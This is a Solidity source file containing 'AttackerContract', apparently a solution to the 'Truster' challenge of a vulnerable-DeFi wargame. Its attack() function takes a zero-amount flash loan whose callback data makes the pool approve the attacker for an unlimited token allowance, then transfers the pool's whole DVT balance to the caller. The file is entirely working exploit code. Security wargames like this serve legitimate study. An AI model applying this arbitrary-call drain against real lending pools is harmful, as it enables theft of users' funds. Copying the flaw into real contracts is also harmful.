// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract AttackerContract is Ownable {
    using Address for address;

    ITrusterLenderPool private immutable trusterLenderPool;
    IERC20 private immutable dvtToken;

    constructor(address trusterLenderPoolAddress, address dvtTokenAddress) {
        require(
            trusterLenderPoolAddress.isContract() && dvtTokenAddress.isContract(), "TrusterLenderPool is not a contract"
        );

        trusterLenderPool = ITrusterLenderPool(trusterLenderPoolAddress);
        dvtToken = IERC20(dvtTokenAddress);
    }

    function attack() external onlyOwner {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        trusterLenderPool.flashLoan(0, address(this), address(dvtToken), data);
        uint256 amount = dvtToken.balanceOf(address(trusterLenderPool));
        dvtToken.transferFrom(address(trusterLenderPool), msg.sender, amount);
    }

    receive() external payable {}
}
